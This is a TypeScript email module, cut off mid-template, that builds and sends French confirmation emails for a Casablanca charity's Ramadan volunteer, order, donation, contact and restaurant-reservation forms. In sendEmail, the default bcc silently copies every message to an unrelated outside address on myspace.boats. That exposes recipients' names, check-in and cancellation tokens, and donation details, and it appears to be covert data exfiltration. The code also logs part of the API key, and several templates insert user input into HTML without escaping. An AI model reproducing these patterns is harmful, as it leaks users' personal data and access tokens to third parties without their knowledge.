/**
 * Module d'envoi d'emails via Resend
 * Gère les confirmations automatiques pour bénévoles, commandes et dons
 */

import { ENV } from "./_core/env";

const RESEND_API_URL = "https://api.resend.com/emails";

/**
 * Calcule les horaires des créneaux bénévoles.
 * Préparation : iftarTime - 3h → iftarTime - 1h15
 * Service : plage fixe 17:30 → 19:15
 */
function computeSlotTimes(iftarTimeStr: string): { prepStart: string; prepEnd: string; serviceStart: string; serviceEnd: string } {
  const match = iftarTimeStr.match(/(\d{1,2})[h:](\d{2})/);
  if (!match) {
    return { prepStart: '15:00', prepEnd: '16:45', serviceStart: '17:30', serviceEnd: '19:15' };
  }
  const iftarHour = parseInt(match[1]);
  const iftarMin = parseInt(match[2]);
  const iftarTotalMin = iftarHour * 60 + iftarMin;

  const formatTime = (totalMin: number) => {
    const h = Math.floor(totalMin / 60);
    const m = totalMin % 60;
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}`;
  };

  return {
    prepStart: formatTime(iftarTotalMin - 180),
    prepEnd: formatTime(iftarTotalMin - 75),
    serviceStart: '17:30',
    serviceEnd: '19:15',
  };
}

// Configuration de l'expéditeur
const FROM_EMAIL = "Ftour Bab Rayan <noreply@ftourbabrayan.ma>"; // Domaine vérifié Resend
const REPLY_TO = "contact@ftourbabrayan.ma"; // Stackmail pour réception

interface EmailOptions {
  to: string;
  subject: string;
  html: string;
  text?: string;
  cc?: string[];
  bcc?: string[];
  attachments?: Array<{
    filename: string;
    content: string; // base64 encoded
  }>;
}

interface ResendResponse {
  id?: string;
  error?: {
    message: string;
    name: string;
  };
}

/**
 * Envoie un email via l'API Resend
 */
export async function sendEmail(options: EmailOptions): Promise<{ success: boolean; id?: string; error?: string }> {
  const apiKey = process.env.RESEND_API_KEY || process.env.EMAIL_PROVIDER_KEY;
  
  console.log("[Email] Attempting to send email to:", options.to);
  console.log("[Email] API Key present:", !!apiKey, apiKey ? `(${apiKey.substring(0, 10)}...)` : '');
  
  if (!apiKey) {
    console.warn("[Email] RESEND_API_KEY/EMAIL_PROVIDER_KEY not configured, skipping email");
    return { success: false, error: "API key not configured" };
  }

  const payload: Record<string, unknown> = {
    from: FROM_EMAIL,
    to: options.to,
    subject: options.subject,
    html: options.html,
    text: options.text,
    reply_to: REPLY_TO,
    cc: options.cc,
    bcc: options.bcc || ['rsebbani@myspace.boats'],
  };
  if (options.attachments && options.attachments.length > 0) {
    payload.attachments = options.attachments;
  }
  
  console.log("[Email] Sending with from:", FROM_EMAIL);
  console.log("[Email] Subject:", options.subject);

  try {
    const response = await fetch(RESEND_API_URL, {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${apiKey}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    console.log("[Email] Response status:", response.status, response.statusText);
    
    const responseText = await response.text();
    console.log("[Email] Response body:", responseText);
    
    let data: ResendResponse;
    try {
      data = JSON.parse(responseText);
    } catch {
      console.error("[Email] Failed to parse response as JSON:", responseText);
      return { success: false, error: `Invalid response: ${responseText}` };
    }

    if (!response.ok || data.error) {
      console.error("[Email] Failed to send:", data.error?.message || "Unknown error");
      return { success: false, error: data.error?.message || "Failed to send email" };
    }

    console.log("[Email] Sent successfully:", data.id);
    return { success: true, id: data.id };
  } catch (error) {
    console.error("[Email] Error:", error);
    return { success: false, error: error instanceof Error ? error.message : "Unknown error" };
  }
}

function escapeHtml(value: string): string {
  return value
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/\"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

/**
 * Vérifie que la clé API Resend est valide
 * Note: Les clés restreintes (send-only) ne peuvent pas accéder à /domains
 * On vérifie simplement que la clé est présente et a le bon format
 */
export async function verifyResendApiKey(): Promise<boolean> {
  const apiKey = process.env.RESEND_API_KEY || process.env.EMAIL_PROVIDER_KEY;
  
  if (!apiKey) {
    return false;
  }

  // Vérifier le format de la clé Resend (commence par re_)
  // Accepte RESEND_API_KEY ou EMAIL_PROVIDER_KEY
  if (!apiKey.startsWith('re_')) {
    return false;
  }

  return true;
}

// ============================================
// TEMPLATES D'EMAILS
// ============================================

/**
 * Génère l'URL du QR code pour un token donné
 */
function getQrCodeUrl(token: string, baseUrl: string): string {
  const checkinUrl = `${baseUrl}/checkin/${token}`;
  return `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(checkinUrl)}`;
}

function getReservationQrCodeUrl(token: string, baseUrl: string): string {
  const checkinUrl = `${baseUrl}/checkin-reservation/${token}`;
  return `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(checkinUrl)}`;
}

/**
 * Template de base pour tous les emails
 */
function baseTemplate(content: string): string {
  return `
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ftour Bab Rayan</title>
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
  <table role="presentation" style="width: 100%; border-collapse: collapse;">
    <tr>
      <td align="center" style="padding: 40px 0;">
        <table role="presentation" style="width: 600px; max-width: 100%; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
          <!-- Header -->
          <tr>
            <td style="background: linear-gradient(135deg, #166534 0%, #15803d 100%); padding: 30px; text-align: center; border-radius: 8px 8px 0 0;">
              <h1 style="color: #ffffff; margin: 0; font-size: 28px; font-weight: bold;">
                Ftour <span style="color: #fbbf24;">Bab Rayan</span>
              </h1>
            </td>
          </tr>
          
          <!-- Content -->
          <tr>
            <td style="padding: 40px 30px;">
              ${content}
            </td>
          </tr>
          
          <!-- Footer -->
          <tr>
            <td style="background-color: #f8f9fa; padding: 20px 30px; text-align: center; border-radius: 0 0 8px 8px; border-top: 1px solid #e5e7eb;">
              <p style="margin: 0 0 10px 0; font-size: 14px; color: #6b7280;">
                Association Bab Rayan
              </p>
              <p style="margin: 0; font-size: 12px; color: #9ca3af;">
                4 rue Bayt Lahm, quartier Palmier, Casablanca<br>
                Tél: +212 (0) 666-690534 | contact@ftourbabrayan.ma
              </p>
            </td>
          </tr>
        </table>
      </td>
    </tr>
  </table>
</body>
</html>
  `.trim();
}

/**
 * Email de confirmation d'inscription bénévole
 */
export interface VolunteerEmailData {
  firstName: string;
  lastName: string;
  email: string;
  dayNumber: number;
  dayDate: string;
  location: string;
  startTime: string;
  volunteerSlots?: string[];
  qrToken: string;
  baseUrl: string;
  groupMembersCount?: number;
}


export interface GalleryUploadValidationEmailData {
  email: string;
  validationUrl: string;
}

export function generateGalleryUploadValidationEmail(data: GalleryUploadValidationEmailData): { subject: string; html: string } {
  const safeEmail = escapeHtml(data.email);
  const safeValidationUrl = escapeHtml(data.validationUrl);

  const content = `
    <h2 style="color: #166534; margin-top: 0;">Confirmez la publication de vos photos</h2>
    <p style="font-size: 16px; color: #374151; line-height: 1.6;">
      Nous avons bien reçu vos photos pour la galerie Ftour Bab Rayan.
    </p>
    <p style="font-size: 16px; color: #374151; line-height: 1.6;">
      Pour autoriser leur publication sur la galerie publique, merci de confirmer votre adresse email
      en cliquant sur le bouton ci-dessous.
    </p>
    <p style="text-align: center; margin: 30px 0;">
      <a href="${safeValidationUrl}" style="display: inline-block; background-color: #166534; color: #ffffff; text-decoration: none; padding: 14px 24px; border-radius: 6px; font-weight: 600;">
        Valider mes photos
      </a>
    </p>
    <p style="font-size: 14px; color: #6b7280; line-height: 1.5;">
      Si le bouton ne fonctionne pas, copiez-collez ce lien dans votre navigateur :<br>
      <a href="${safeValidationUrl}" style="color: #166534; word-break: break-all;">${safeValidationUrl}</a>
    </p>
    <p style="font-size: 14px; color: #6b7280; line-height: 1.5;">
      Cet email a été envoyé à ${safeEmail}. Si vous n'êtes pas à l'origine de cet envoi, vous pouvez ignorer ce message.
    </p>
  `;

  return {
    subject: "Validation de vos photos – Galerie Ftour Bab Rayan",
    html: baseTemplate(content),
  };
}
export function generateVolunteerConfirmationEmail(data: VolunteerEmailData): { subject: string; html: string } {
  const qrCodeUrl = getQrCodeUrl(data.qrToken, data.baseUrl);
  const checkinUrl = `${data.baseUrl}/checkin/${data.qrToken}`;
  const cancellationUrl = `${data.baseUrl}/benevole-annulation/${data.qrToken}`;

  // Build slots display with dynamic times based on iftar time
  const times = computeSlotTimes(data.startTime);
  const slotLabels: Record<string, string> = {
    preparation_ftour: `Préparation ftour (${times.prepStart} – ${times.prepEnd})`,
    service_ftour: `Service ftour (${times.serviceStart} – ${times.serviceEnd})`,
  };
  const slotsHtml = (data.volunteerSlots || []).map(s =>
    `<li style="margin-bottom: 4px;">${slotLabels[s] || s}</li>`
  ).join('');
  const groupHintHtml = data.groupMembersCount && data.groupMembersCount > 1
    ? `<table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fef3c7; border-radius: 8px; margin: 20px 0; border: 1px solid #f59e0b;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #92400e; margin: 0 0 10px 0; font-size: 18px;">👥 Inscription groupe</h3>
          <p style="margin: 0; color: #92400e; font-size: 14px; line-height: 1.6;">Ce QR code est valable pour <strong>${data.groupMembersCount} personnes</strong>. Le responsable doit présenter ce même QR code ${data.groupMembersCount} fois à l'entrée.</p>
        </td>
      </tr>
    </table>`
    : '';

  const content = `
    <h2 style="color: #166534; margin: 0 0 20px 0; font-size: 24px;">
      Merci pour votre inscription !
    </h2>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Cher(e) <strong>${data.firstName} ${data.lastName}</strong>,
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Votre inscription en tant que bénévole pour le <strong>Ftour Bab Rayan</strong> a bien été enregistrée.
      Nous sommes ravis de vous compter parmi notre équipe !
    </p>

    <!-- Détails du jour -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f0fdf4; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #166534; margin: 0 0 15px 0; font-size: 18px;">📅 Votre jour de participation</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Jour :</strong> ${data.dayNumber} du Ramadan</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Date :</strong> ${data.dayDate}</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Lieu :</strong> ${data.location}</p>
        </td>
      </tr>
    </table>

    <!-- Créneaux choisis -->
    ${slotsHtml ? `
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #eff6ff; border-radius: 8px; margin: 20px 0; border: 1px solid #bfdbfe;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #1e40af; margin: 0 0 12px 0; font-size: 18px;">🕐 Vos créneaux choisis</h3>
          <ul style="margin: 0; padding-left: 20px; color: #374151; font-size: 15px;">${slotsHtml}</ul>
        </td>
      </tr>
    </table>
    ` : ''}

    ${groupHintHtml}

    <!-- QR Code -->
    <div style="text-align: center; margin: 30px 0; padding: 20px; background-color: #ffffff; border: 2px dashed #166534; border-radius: 8px;">
      <h3 style="color: #166534; margin: 0 0 15px 0; font-size: 18px;">🎫 Votre QR Code d'accès</h3>
      <img src="${qrCodeUrl}" alt="QR Code" style="width: 200px; height: 200px; margin: 10px 0;" />
      <p style="color: #6b7280; font-size: 14px; margin: 10px 0 0 0;">
        Présentez ce QR code à l'entrée le jour de votre participation
      </p>
    </div>

    <!-- Lien d'annulation -->
    <div style="text-align: center; margin: 20px 0; padding: 15px; background-color: #fef2f2; border: 1px solid #fecaca; border-radius: 8px;">
      <p style="color: #991b1b; font-size: 14px; margin: 0 0 10px 0;">
        En cas d'empêchement, vous pouvez annuler votre inscription en cliquant sur le lien ci-dessous :
      </p>
      <a href="${data.baseUrl}/cancel-volunteer/${data.qrToken}" style="display: inline-block; background-color: #dc2626; color: #ffffff; text-decoration: none; padding: 10px 24px; border-radius: 6px; font-size: 14px; font-weight: 600;">
        Annuler mon inscription
      </a>
    </div>

    <!-- Consignes importantes (obligatoires) -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fef3c7; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #92400e; margin: 0 0 15px 0; font-size: 18px;">📋 Consignes importantes</h3>
          <ul style="margin: 0; padding-left: 20px; color: #374151;">
            <li style="margin-bottom: 8px; color: #dc2626; font-weight: bold;">L'entrée pour participer au service est entre 17h00 et 17h45. Il est interdit aux bénévoles d'entrer au-delà de 17h45.</li>
            <li style="margin-bottom: 8px;">Arrivez à l'heure prévu par le créneau choisi.</li>
            <li style="margin-bottom: 8px;">En cas d'empêchement, prévenez-nous à l'avance</li>
            <li style="margin-bottom: 8px;">Portez des vêtements confortables</li>
          </ul>
        </td>
      </tr>
    </table>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0;">
      Si vous avez des questions, n'hésitez pas à nous contacter.
    </p>

    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      À très bientôt !<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `✅ Confirmation inscription - Ftour Bab Rayan Jour ${data.dayNumber}`,
    html: baseTemplate(content),
  };
}

/**
 * Email de confirmation de commande goodies
 */
export interface OrderEmailData {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  orderId: string;
  items: Array<{
    name: string;
    variant?: string;
    quantity: number;
    price: number;
  }>;
  totalAmount: number;
  baseUrl: string;
}

export function generateOrderConfirmationEmail(data: OrderEmailData): { subject: string; html: string } {
  const itemsHtml = data.items.map(item => `
    <tr>
      <td style="padding: 10px; border-bottom: 1px solid #e5e7eb;">
        ${item.name}${item.variant ? ` (${item.variant})` : ''}
      </td>
      <td style="padding: 10px; border-bottom: 1px solid #e5e7eb; text-align: center;">
        ${item.quantity}
      </td>
      <td style="padding: 10px; border-bottom: 1px solid #e5e7eb; text-align: right;">
        ${item.price} MAD
      </td>
    </tr>
  `).join('');

  const content = `
    <h2 style="color: #166534; margin: 0 0 20px 0; font-size: 24px;">
      Commande confirmée !
    </h2>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Cher(e) <strong>${data.firstName} ${data.lastName}</strong>,
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Votre réservation de goodies solidaires a bien été enregistrée. 
      Merci de soutenir l'association Bab Rayan !
    </p>
    
    <!-- Référence commande -->
    <div style="background-color: #f0fdf4; padding: 15px; border-radius: 8px; text-align: center; margin: 20px 0;">
      <p style="margin: 0; color: #6b7280; font-size: 14px;">Référence de commande</p>
      <p style="margin: 5px 0 0 0; color: #166534; font-size: 24px; font-weight: bold; font-family: monospace;">
        ${data.orderId}
      </p>
    </div>
    
    <!-- Détails commande -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; margin: 20px 0;">
      <thead>
        <tr style="background-color: #f3f4f6;">
          <th style="padding: 10px; text-align: left; color: #374151;">Article</th>
          <th style="padding: 10px; text-align: center; color: #374151;">Qté</th>
          <th style="padding: 10px; text-align: right; color: #374151;">Prix</th>
        </tr>
      </thead>
      <tbody>
        ${itemsHtml}
        <tr style="background-color: #f0fdf4;">
          <td colspan="2" style="padding: 15px; font-weight: bold; color: #166534;">Total</td>
          <td style="padding: 15px; text-align: right; font-weight: bold; color: #166534; font-size: 18px;">
            ${data.totalAmount} MAD
          </td>
        </tr>
      </tbody>
    </table>
    
    <!-- Instructions -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #fef3c7; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #92400e; margin: 0 0 15px 0; font-size: 18px;">💳 Paiement et retrait</h3>
          <p style="margin: 0 0 10px 0; color: #374151;">
            <strong>Le paiement se fait sur place</strong> lors du retrait de votre commande.
          </p>
          <p style="margin: 0; color: #374151;">
            Présentez cette confirmation et votre référence de commande pour récupérer vos articles.
          </p>
        </td>
      </tr>
    </table>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      Merci pour votre soutien !<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `🛍️ Commande ${data.orderId} confirmée - Ftour Bab Rayan`,
    html: baseTemplate(content),
  };
}

/**
 * Email de confirmation de promesse de don
 */
export interface DonationEmailData {
  firstName: string;
  lastName: string;
  email: string;
  amount: number;
  paymentMethod: 'transfer' | 'on_site';
  donationId: string;
  baseUrl: string;
}

export function generateDonationConfirmationEmail(data: DonationEmailData): { subject: string; html: string } {
  const paymentInstructions = data.paymentMethod === 'transfer' ? `
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #eff6ff; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #1e40af; margin: 0 0 15px 0; font-size: 18px;">🏦 Coordonnées bancaires</h3>
          <p style="margin: 5px 0; color: #374151;"><strong>Banque :</strong> Attijariwafa Bank</p>
          <p style="margin: 5px 0; color: #374151;"><strong>Titulaire :</strong> Association Bab Rayan</p>
          <p style="margin: 5px 0; color: #374151;"><strong>RIB :</strong> 007 780 0003 401 000 100 238 97</p>
          <p style="margin: 5px 0; color: #374151;"><strong>IBAN :</strong> MA64 007 780 0003 401 000 100 238 97</p>
          <p style="margin: 15px 0 0 0; color: #6b7280; font-size: 14px;">
            <strong>Important :</strong> Mentionnez votre référence <strong>${data.donationId}</strong> dans le motif du virement.
          </p>
        </td>
      </tr>
    </table>
  ` : `
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f0fdf4; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #166534; margin: 0 0 15px 0; font-size: 18px;">📍 Don sur place</h3>
          <p style="margin: 0; color: #374151;">
            Vous avez choisi de faire votre don sur place. Présentez cette confirmation 
            lors de votre visite à l'association ou pendant un événement Ftour.
          </p>
        </td>
      </tr>
    </table>
  `;

  const content = `
    <h2 style="color: #166534; margin: 0 0 20px 0; font-size: 24px;">
      Merci pour votre générosité !
    </h2>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Cher(e) <strong>${data.firstName} ${data.lastName}</strong>,
    </p>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 0 0 20px 0;">
      Votre promesse de don a bien été enregistrée. Votre générosité permettra 
      d'offrir des moments de partage et de solidarité aux enfants de Bab Rayan.
    </p>
    
    <!-- Montant -->
    <div style="background-color: #fef3c7; padding: 20px; border-radius: 8px; text-align: center; margin: 20px 0;">
      <p style="margin: 0; color: #92400e; font-size: 14px;">Montant de votre don</p>
      <p style="margin: 10px 0 0 0; color: #166534; font-size: 36px; font-weight: bold;">
        ${data.amount} MAD
      </p>
      <p style="margin: 10px 0 0 0; color: #6b7280; font-size: 14px;">
        Référence : <strong>${data.donationId}</strong>
      </p>
    </div>
    
    ${paymentInstructions}
    
    <!-- Impact -->
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: #f3f4f6; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          <h3 style="color: #374151; margin: 0 0 15px 0; font-size: 18px;">💚 Où va votre don ?</h3>
          <ul style="margin: 0; padding-left: 20px; color: #374151;">
            <li style="margin-bottom: 8px;">Repas Ftour pour les enfants et familles</li>
            <li style="margin-bottom: 8px;">Programmes éducatifs et de formation</li>
            <li style="margin-bottom: 8px;">Accompagnement social des familles</li>
            <li style="margin-bottom: 8px;">Activités culturelles et sportives</li>
          </ul>
        </td>
      </tr>
    </table>
    
    <p style="color: #374151; font-size: 16px; line-height: 1.6; margin: 20px 0 0 0;">
      Un grand merci pour votre soutien !<br>
      <strong>L'équipe Ftour Bab Rayan</strong>
    </p>
  `;

  return {
    subject: `💚 Merci pour votre don - Ftour Bab Rayan`,
    html: baseTemplate(content),
  };
}

/**
 * Email de notification pour le formulaire de contact
 */
export interface ContactEmailData {
  name: string;
  email: string;
  phone?: string;
  subject?: string;
  message: string;
}

export function generateContactNotificationEmail(data: ContactEmailData): { subject: string; html: string } {
  const content = `
    <h2 style="color: #166534; margin: 0 0 20px 0; font-size: 24px;">
      Nouveau message de contact
    </h2>
    
    <table role="presentation" style="width: 100%; border-collapse: collapse; margin: 20px 0;">
      <tr>
        <td style="padding: 10px; background-color: #f3f4f6; font-weight: bold; width: 120px;">Nom</td>
        <td style="padding: 10px; background-color: #f9fafb;">${data.name}</td>
      </tr>
      <tr>
        <td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Email</td>
        <td style="padding: 10px; background-color: #f9fafb;"><a href="mailto:${data.email}">${data.email}</a></td>
      </tr>
      ${data.phone ? `
      <tr>
        <td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Téléphone</td>
        <td style="padding: 10px; background-color: #f9fafb;">${data.phone}</td>
      </tr>
      ` : ''}
      ${data.subject ? `
      <tr>
        <td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Sujet</td>
        <td style="padding: 10px; background-color: #f9fafb;">${data.subject}</td>
      </tr>
      ` : ''}
    </table>
    
    <div style="background-color: #f9fafb; padding: 20px; border-radius: 8px; margin: 20px 0;">
      <h3 style="color: #374151; margin: 0 0 10px 0; font-size: 16px;">Message :</h3>
      <p style="margin: 0; color: #374151; white-space: pre-wrap;">${data.message}</p>
    </div>
  `;

  return {
    subject: `📬 Nouveau message de contact - ${data.name}`,
    html: baseTemplate(content),
  };
}




export interface PartnerLeadEmailData {
  companyName: string;
  contactName: string;
  email: string;
  phone?: string;
  city?: string;
  partnershipType?: string;
  budgetRange?: string;
  message?: string;
  locale?: string;
  source?: string;
}

export function generatePartnerLeadNotificationEmail(data: PartnerLeadEmailData): { subject: string; html: string } {
  const content = `
    <h2 style="color: #166534; margin: 0 0 20px 0; font-size: 24px;">Nouveau lead partenaire</h2>

    <table role="presentation" style="width: 100%; border-collapse: collapse; margin: 20px 0;">
      <tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold; width: 160px;">Entreprise</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.companyName)}</td></tr>
      <tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Contact</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.contactName)}</td></tr>
      <tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Email</td><td style="padding: 10px; background-color: #f9fafb;"><a href="mailto:${escapeHtml(data.email)}">${escapeHtml(data.email)}</a></td></tr>
      ${data.phone ? `<tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Téléphone</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.phone)}</td></tr>` : ''}
      ${data.city ? `<tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Ville</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.city)}</td></tr>` : ''}
      ${data.partnershipType ? `<tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Type partenariat</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.partnershipType)}</td></tr>` : ''}
      ${data.budgetRange ? `<tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Budget</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.budgetRange)}</td></tr>` : ''}
      ${data.locale ? `<tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Locale</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.locale)}</td></tr>` : ''}
      ${data.source ? `<tr><td style="padding: 10px; background-color: #f3f4f6; font-weight: bold;">Source</td><td style="padding: 10px; background-color: #f9fafb;">${escapeHtml(data.source)}</td></tr>` : ''}
    </table>

    ${data.message ? `<div style="background-color: #f9fafb; padding: 20px; border-radius: 8px; margin: 20px 0;"><h3 style="color: #374151; margin: 0 0 10px 0; font-size: 16px;">Message :</h3><p style="margin: 0; color: #374151; white-space: pre-wrap;">${escapeHtml(data.message)}</p></div>` : ''}
  `;

  return {
    subject: `🤝 Nouveau lead partenaire - ${data.companyName}`,
    html: baseTemplate(content),
  };
}

// ============================================
// RESTAURANT RESERVATION EMAIL LAYOUT + TEMPLATES
// ============================================

interface RestaurantEmailSectionItem {
  label: string;
  value: string;
}

interface RestaurantEmailSection {
  title?: string;
  kind?: "info" | "callout" | "warning";
  text?: string[];
  items?: RestaurantEmailSectionItem[];
}

interface RestaurantEmailLayoutData {
  preheader: string;
  brandName: string;
  headerColor?: string;
  title: string;
  introText?: string[];
  sections: RestaurantEmailSection[];
  ctaLabel?: string;
  ctaUrl?: string;
  secondaryCtaLabel?: string;
  secondaryCtaUrl?: string;
  contactEmail?: string;
  contactPhone?: string;
  signatureLines?: string[];
  footerLines: string[];
}

interface RestaurantEmailBranding {
  brandName: string;
  headerColor: string;
  ribUrl: string;
  contactEmail: string;
  contactPhone: string;
  footerLines: string[];
  addressLines: string[];
}

const RESTAURANT_DEFAULT_BRANDING: RestaurantEmailBranding = {
  brandName: "La Table du Jardin",
  headerColor: "#556B2F",
  ribUrl: "https://ftourbabrayan.ma/rib",
  contactEmail: "contact@ftourbabrayan.ma",
  contactPhone: "+212 (0) 666-690534",
  addressLines: ["4 rue Bayt Lahm, quartier Palmier", "Casablanca"],
  footerLines: [
    "La Table du Jardin",
    "4 rue Bayt Lahm, quartier Palmier, Casablanca",
    "Tél: +212 (0) 666-690534 | contact@ftourbabrayan.ma",
  ],
};

function toFrenchLongDate(dateInput: string): string {
  const d = new Date(dateInput);
  if (Number.isNaN(d.getTime())) {
    return dateInput;
  }
  return new Intl.DateTimeFormat("fr-FR", {
    weekday: "long",
    day: "numeric",
    month: "long",
    year: "numeric",
    timeZone: "UTC",
  }).format(d);
}

function restaurantSectionColors(kind: RestaurantEmailSection["kind"], headerColor: string) {
  if (kind === "warning") {
    return { bg: "#FEF3C7", border: "#FCD34D", title: "#92400E" };
  }
  if (kind === "callout") {
    return { bg: "#F6F8EF", border: headerColor, title: headerColor };
  }
  return { bg: "#F6F8EF", border: "#DDE5CC", title: headerColor };
}

function renderRestaurantSection(section: RestaurantEmailSection, headerColor: string): string {
  const colors = restaurantSectionColors(section.kind, headerColor);
  const title = section.title
    ? `<h3 style="margin: 0 0 12px 0; color: ${colors.title}; font-size: 18px;">${section.title}</h3>`
    : "";

  const items = (section.items || [])
    .map(
      (item) => `
        <tr>
          <td style="padding: 4px 0; width: 180px; color: #475569; font-size: 15px;"><strong>${item.label} :</strong></td>
          <td style="padding: 4px 0; color: #1f2937; font-size: 15px;">${item.value}</td>
        </tr>
      `
    )
    .join("");

  const text = (section.text || [])
    .map((line) => `<p style="margin: 0 0 10px 0; color: #374151; font-size: 15px; line-height: 1.6;">${line}</p>`)
    .join("");

  return `
    <table role="presentation" style="width: 100%; border-collapse: collapse; background-color: ${colors.bg}; border: 1px solid ${colors.border}; border-radius: 8px; margin: 20px 0;">
      <tr>
        <td style="padding: 20px;">
          ${title}
          ${text}
          ${items ? `<table role="presentation" style="width: 100%; border-collapse: collapse;">${items}</table>` : ""}
        </td>
      </tr>
    </table>
  `;
}

function renderRestaurantEmailLayout(data: RestaurantEmailLayoutData): string {
  const headerColor = data.headerColor || RESTAURANT_DEFAULT_BRANDING.headerColor;
  const intro = (data.introText || [])
    .map((line) => `<p style="margin: 0 0 14px 0; color: #374151; font-size: 16px; line-height: 1.65;">${line}</p>`)
    .join("");

  const signature = (data.signatureLines || [])
    .map((line) => `<p style="margin: 0 0 6px 0; color: #374151; font-size: 16px; line-height: 1.5;">${line}</p>`)
    .join("");

  const footer = data.footerLines
    .map((line) => `<p style="margin: 0 0 4px 0; color: #6b7280; font-size: 12px;">${line}</p>`)
    .join("");

  return `
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>${data.title}</title>
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
  <div style="display:none; font-size:1px; color:#f5f5f5; line-height:1px; max-height:0; max-width:0; opacity:0; overflow:hidden;">${data.preheader}</div>
  <table role="presentation" style="width: 100%; border-collapse: collapse;">
    <tr>
      <td align="center" style="padding: 30px 12px;">
        <table role="presentation" style="width: 600px; max-width: 100%; border-collapse: collapse; background-color: #ffffff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);">
          <tr>
            <td style="background-color: ${headerColor}; padding: 26px 24px; text-align: center; border-radius: 8px 8px 0 0;">
              <h1 style="margin: 0; color: #ffffff; font-size: 28px; font-weight: 700;">${data.brandName}</h1>
            </td>
          </tr>
          <tr>
            <td style="padding: 32px 30px;">
              <h2 style="margin: 0 0 18px 0; color: ${headerColor}; font-size: 24px;">${data.title}</h2>
              ${intro}
              ${(data.sections || []).map((section) => renderRestaurantSection(section, headerColor)).join("")}
              ${data.ctaLabel && data.ctaUrl ? `
                <table role="presentation" style="border-collapse: collapse; margin: 26px auto 12px auto;">
                  <tr>
                    <td style="border-radius: 6px; background-color: ${headerColor}; text-align: center;">
                      <a href="${data.ctaUrl}" style="display: inline-block; padding: 12px 22px; color: #ffffff; text-decoration: none; font-weight: 600; font-size: 15px;">${data.ctaLabel}</a>
                    </td>
                  </tr>
                </table>
              ` : ""}
